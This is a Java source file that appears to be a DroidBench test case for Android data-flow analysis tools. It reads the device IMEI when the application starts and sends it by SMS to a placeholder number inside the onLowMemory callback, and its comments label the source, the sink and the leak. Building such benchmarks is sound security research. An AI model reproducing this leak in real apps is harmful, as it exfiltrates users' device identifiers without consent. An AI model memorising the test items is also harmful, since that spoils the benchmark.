package de.ecspride;

import android.Manifest;
import android.app.Application;
import android.content.Context;
import android.content.pm.PackageManager;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * @testcase_name ApplicationLifecycle2
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description A secret value is obtained on application start and leaked in the low memory
 * 	callback.
 * @dataflow source -> onCreate() -> imei -> onLowMemory() -> sink
 * @number_of_leaks 1
 * @challenges Correct handling of callbacks in the Application object
 */
public class ApplicationLifecyle2 extends Application {

	private String imei;
	
	@Override
	public void onCreate() {
		super.onCreate();

		if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
			TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			imei = tm.getDeviceId();
			onLowMemory();
		} else {
			Log.i("DroidBench", "permission not granted");
		}


	}

	@Override
	public void onLowMemory() {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
	}

}
